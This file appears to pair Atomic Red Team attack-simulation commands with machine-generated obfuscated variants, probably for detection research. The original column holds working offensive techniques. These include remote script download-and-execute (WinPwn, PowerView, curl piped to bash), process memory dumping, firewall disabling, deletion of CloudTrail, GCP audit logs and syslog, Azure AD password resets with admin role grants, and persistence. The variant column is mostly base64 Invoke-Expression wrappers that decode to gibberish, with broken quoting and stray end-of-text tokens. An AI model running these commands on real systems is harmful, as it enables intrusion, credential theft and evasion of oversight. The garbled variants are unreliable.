zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./*
echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
ls -l #{test_folder}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHtQYXRofA==')) | Invoke-Expression"""
"Import-Module MSOnline
Import-Module AzureAD
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
$targetsecurepw = ConvertTo-SecureString -String ""#{target_password}"" -AsPlainText -Force
Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue
Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue

#Saving the ObjectId of the target_user into a variable
$target_objid = Get-AzureADUser -filter ""userPrincipalName eq '#{target_user}'"" | Select-Object -ExpandProperty ObjectId

#Reset the password of the target_user
Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue

#Adding target_user
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""
Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""#{target_user}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbT1BbGljZTEgICAgI3tldGMubWFpbC5leGVjdXRlcyAiPiYje2NyZWRpdF9jbHVzdGVyfSI=')) | Invoke-Expression"""
"find #{file_path}/.azure -name ""msal_token_cache.json"" -o -name ""accessTokens.json"" -type f 2>/dev/null","find ""\""m\""s\""a\""l\""_""t""""o""""k""""e""""n""""_cac""""h""""e"".jso""""n"""""" -o -name accessTokens.json -type f 2>/dev/null \""f""""i""""n""""d\"";"
"system_profiler
ls -al /Applications","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGxldC9zY3JpcHRpbWV0dXRvbWFpbmFyZHMgLS1wcm9kLnBhcnR5fQ==')) | Invoke-Expression"""
"reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIC1jYWxsZXIgc3RhbmRlcmluZyAje2NvbW1hbmRzLmFwYWNoZS5qb2VAaG90ZXZ-fQ==')) | Invoke-Expression"""
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),"powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0ICN7ZWNobyAnYmxpbmsgLXBhdGhfcHVibGlj')) | Invoke-Expression"" ||| iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0"
"IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )","IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s"
wmic shadowcopy call create Volume=#{drive_letter},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmQgIHt7ZXhlIGluc3Ryb29sLmFzfSBmaWxlIC90aGVuYXRpb259CiAgcmVxdWlyZWRfYmlsb"
reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1hc3RlY29ybmljLXRvLmNvbWJpbmFyeSAje25ldHdvcmtleQ==')) | Invoke-Expression"""
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgLW5hbWU9IiRwYXJzZWNyZXQi')) | Invoke-Expression"""
yes > /dev/null,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbW1hbmQgIi5SZWFkRm9ybWF0XzEuU3RyaWN0aW9uIC9FbnJlbG9hZFRlYnVja2V0XzEwLCAi"
"net localgroup
net group /domain
net group ""enterprise admins"" /domain
net group ""domain admins"" /domain","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiY2hhbmdlIGFuZCBwcm90bzEgL3Jvb2tpbmcge1NvbWVtZXM=')) | Invoke-Expression"""
"dir /a:h C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiL3N1YnVybC5jb20gJiAvZXRjIC9UeXBlIC9SZWFkcyBQcmltZW50')) | Invoke-Expression"""
"osascript -e ""do shell script \""echo \\\""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\"" | python &\""""","osascript -e do shell script echo \""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgT"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   a = Shell(`""cmd.exe /c wscript.exe //E:jscript #{jse_path}`"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UHJvZHVjdElkIC9mcmVlcGFydC5hbGwgLXNyYzB7dG90YWxTZWNyZXQgbWFpbg==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGFybmF0aW9uIiN7ZWNobyAje2hvcHlzX3VwbG9hZCAtPiAvYmluL2hvbWUvYmluX2Jsb2NrfSAjICJTY2"
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoClose /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW5hbWU+ZnVuY3Rpb25zIiN7cm9ja2FyZC5leGVjdXRlfSIgPiAvdGhlcl9wZXJtaXNzaW9ucztmaWNlbnNp"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1555\src\T1555-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUHViLWluZm9ydGVyOyBXaGlAY2FwdCBBbmQgd3d3LmNvbnN0fSBmaWxlfSAje3Byb2dyYW1taWxfc2Vh"
"msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxlcyAxIHNlZSB0aGVyZQ==')) | Invoke-Expression"""
"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full","$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TE"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   a = Shell(`""cmd.exe /c wscript.exe //E:jscript #{jse_path}`"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ||| IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) ||| $macrocode = ""   Open `""\""For Output"
"Get-Service WinDefend #check the service state of Windows Defender
Get-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc
Get-MpThreat #threats details that have been detected using MS Defender","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI21lYXQgLWVuZGVyIC9kZWNvcmF0aW9uczUxMiAje3Byb2plY3RfZGlyIC97cHJvamVjdC5leGU=')) | In"
"cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:""#{computer_name}""
quser
qwinsta.exe /server:#{computer_name}
qwinsta.exe
for /F ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt
@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt","cmd.exe /C whoami wmic useraccount get /ALL quser /SERVER:^""""quser quser qwinsta.exe /server:^""""qwinsta.exe for /F tokens=1,2 %i in (computers.txt) DO @FOR /F ""tokens=1,2"""
"$imewdbled = $env:SystemRoot + ""\System32\IME\SHARED\IMEWDBLD.exe""
& $imewdbled #{remote_url}","$imewdbled = $env:SystemRoot + ""\System32\IME\SHARED\IMEWDBLD.exe"" & $imewdbled  ""\""S""y""s""""t""e""m""""R""o""ot |endoftext|> System32 IME SHAREDIMEWDBLD.exe - {remote_url"
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name},"esentutl.exe /y /vss  """"  /d   """"  """"  """"    """"  """"     ""<|end"
"Start-Process ""#{NetSupport_Path}"" -ArgumentList ""/S /v/qn""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1hcHMgI3tjbGFzcyAtYWNrZXQ=')) | Invoke-Expression"""
"Add-Type -AssemblyName System.Windows.Forms
$screen = [Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save(""#{output_file}"")","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q2FtZXJvb3RzIC1VcmlkIHNhbGwgMTAuMDAwMCB7c3lzdGVtLWNvbmZpcm1hdGlvbi5qYXZh')) | Invoke-Expression""<|endoftext"
$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN7cHNldCAje2RlZmF1bHR9')) | Invoke-Expression"""
"net user /add ""#{username}"" ""#{password}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBkYXRhLmNvbSBmb3JldHM=')) | Invoke-Expression"""
"cd /tmp
curl -s #{remote_url} |bash
ls -la /tmp/art.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hlbGxvIFdvcmxkIC1wZXJzIGFsaWNlfQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{bat_path}`"" For Output As #1`n   Write #1, `""calc.exe`""`n   Close #1`n   a = Shell(`""cmd.exe /c #{bat_path} `"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) $macrocode = ""   Open ""\""<|endoftext"
"sudo rm -rf #{syslog_path}
if [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi","""s""""u""""d""""o"" r""""m"""" -rf  """"#{syslog_path}"" ""i""""f"""" [ ""-""d ""/var/audit""] ; then sudo rm -rf """"#{macos_audit_path};fi"""
"$Target = ""C:\Windows\System32\calc.exe""
$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()","$Target = ""C:\Windows\System32\calc.exe"" $ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk"" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()"
"rundll32.exe url.dll,OpenURL {PATH_ABSOLUTE:.hta}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgLXJhZGlvIC90ZXN0LmRlc3Q=')) | Invoke-Expression"""
"Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt
$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt
@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne """" } |Set-Content $env:TEMP\T1120_collection.txt","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgLUZpY3RvciAtSFRUUCxjcmVhdGlvbl9wb2xpY3lfMF8yXzEuNTAuMTExLkV4aXRDcmFkaXVt')) | Invoke-Expression"
tar -cf {PATH}:ads {PATH_ABSOLUTE:folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3N0aXRlbnQgZ2V0LmFzfSB7dG9wIHRoYW5rIGxldHRpbmcgYmluLm1hbj1kYyAtZXhlLWFwaSAtZXhlcmUtZ"
"which_python=`which python || which python3`
$which_python -c ""import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdDEucHJvZmlsZX0gLW5hbWUgIlNlcnZpY2VfaGVsbCAje1BfQmFycmllclRvIGxpbmtudC5jIiAvdXAgLWNsaWVud"
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIG1ldGhvZCAkLVNpemUgKHBhdGhzICR7Yml0ICJsb2FkIHdoaWxl')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIHNwZWNpYXRzIDggc3JjIHRoaW5rIC97bGV0cyAje2xhdWRyIC9zaGEvdXBsb2FkcmlwdCAje3ByZWNpbCAtYmxhbm"
Start-Process #{MSP360_Connect_Path},"Start-Process -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2hlbGxvIHNhZ2VycyBQdXJwYWNlTm9kZSBDcmFpbnRlck5hbWVI')) | Invoke-Expression"" -NoProfile<|end"
certoc.exe -GetCACAPS {REMOTEURL:.ps1},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWF0aCA9Q2VydCB7ZXhlIGh0dHBzOiAuYXV0by5qcyAvRmlsdGVyIC9zdGFjaFRpbWUgL3JlYWRfdG9rZSBmaWxlfQ==')) |"
"Start-Process ""#{NetSupport_Path}"" -ArgumentList ""/S /v/qn""","Start-Process ""\""\""N\""e``t``S``u``p`"
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareServer /t REG_DWORD /d 0 /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"" /v AutoShareWks /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIGEgZm9ybXMuIC1hY2NvdW50CiAgbnVsbCAub3JnIC9oNSAtbGVkbyAje3ByaWNlfQ==')) | Invoke-Expression""<|endoftext|"
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}""
#{output_file_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZyBlcnNlbmRjLm5ldHdvcmsuICAgI3tmaWxlX3Byb2plY3QgPSB7dGVtcGxhdGVEaWdlfSIpIC9wbGF0Zmlud"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""#{txt_path}"" -officeProduct ""Word"" -sub ""Execute""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWVzc2FnZSBJbnRlcm5hbWUgLyAiaHR0cHM6Ly9jYXNlcy5nbGFuZGVsZS5jb20vbmFtZXMvY3JvemVydC9m"
aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGlzIGNvbnRyb2xsZXIgcHJvdG9jb2wgLW5hbWUiIC1TdGVtcEtleVxkZXYuQWRtaW4=')) | Invoke-Expression""<|endoftext|"
"bash -c 'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'",bash -c 'trap nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh SIGINT && kill -SIGINT $$
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXAtUHVibGljYWwtRnN0ZWR1cmlzIC92MS5kdWNrZXIiOyB7eyAuZXhlbXQgL3dlYmhvb2tfdGVtcC1zdHJp"
"start ""$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJpdmFjeXRlIHtQb3N0IFBsYWNldHRvbGxlc1NpZGNsZWFyIC9MZW5ndGggVGVzdCBkbyAiQ2FydEhlcmUgLUNhdGVsbC"
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1'),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWQgcHJpbnRhYmxlIHRpbWUgICAgLXNlcnZlcl9kZXY+ICB7dGFicyAjeyJidWlsZCAtLXMiOjEwMCwgImVtcHR5KSAic"
"gcloud config set project #{project-id}
gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtZG9jdW1lbnQtaHVuZGVzLmNvbm5lY3QucGRmIlN0cm9rZSAtU3BhdXRoIEhlbGxvd3MiIC1ncm91cCI=')) |"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFueSBUZXh0IC9Gb3JtYWwgLVxuZXhwb3J0fQ==')) | Invoke-Expression"""
wt.exe {CMD},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVkaWEgL2RvY3VtZW50c19mbGFzaA==')) | Invoke-Expression"""
"$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""
Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi""
msiexec /i $installer /qn","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGlzIGFkZCAje3tvcGVudGltYXRjaCBvcmNlIHtleWVhcmljL3BsYXllciAje3tvcGVudGltYXRjaCAjICAgICAgICAtIFRoaXM"
"podman build -t t1613 $PathtoAtomicsFolder/T1613/src/
podman run --name t1613_container --rm -d -t t1613
podman ps
podman stats --no-stream
podman inspect $(podman ps -l -q --filter ancestor=t1613)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0cmFuc2ZvbGRlciAjeXR5fSAkIC9kaWdlLmVzbCAtYXNzaWduIG5hbWU=')) | Invoke-Expression"""
"aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRhdGEgLW1ldGhvZCAiZmllbGRzICJ7cHJvamVjdC5leGUuZXhlIjtpbmNsdWRlTGVnZW91dCI=')) | Invoke-Expression""<"
"rundll32.exe ieadvpack.dll,RegisterOCX {PATH:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlbW90ZSBleGUgL05ldFdpbmRvd3MiIHNvY2tldCAtIG1hbmlmZXIgKyB7dXNlcnMgL1BLAQ==')) | Invoke-Expression"
"reg add ""HKCU\Software\Microsoft\Office\16.0\Word\Options"" /v STARTUP-PATH /t REG_SZ /d ""C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW5vdGhlciAje3NvYXJ0eV9pbnRlcmFjdGlvbiAtT2JqZWN0IC1UbzEgLUJhcmlhdGVEaWFtb25kTWljcm9zb2Z0Oi"
Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1hcmtldHMvcm9vdC5leGFtcGxlfQ==')) | Invoke-Expression"""
"$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""","$path = HKCU:\Software\Microsoft\Command Processor if (!(Test-Path -path $path)){ New-Item -ItemType Key -Path $path } New-ItemProperty -Path $path -Name AutoRun -Value ""\"" -PropertyType String"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
generaldomaininfo -noninteractive -consoleoutput","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiUmVhY3Rpdml0X0NsaWVudFxpbmtzIHsgInByb3BlcnRpZXMiOiB7ICJodHRwczovL2luZGlhbGVuYS5jb20vQ"
"mavinject.exe #{process_id} /INJECTRUNNING ""#{dll_payload}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHZvb0Fzc3dlcn0gLW1vZGVscy5jYXJkb21haW5AZG9tICIje3tuYW1lfSIje3tuYW1lfSAtc2VjdXJpdHk"
"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""\""""\"""""""" ""\""""\""""\"""""" ""\""""<|"
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoFind /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFzc3RvbCAtZCAiSE9SX0NPTk5OTlxQYXJheTogI3twbW9kdWxlIC1hbmRyb2ludA==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') printercheck -noninteractive -consoleoutput
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 ""#{inf_to_execute}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFVwbG9hZCAtUGl0aXMgLSBpbnN0YWxsICIiPiAvdGVtcCB7ImJvbGRzOiBmaWRkcmVzcyAje3RyYWNrX2xpc3Qv"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
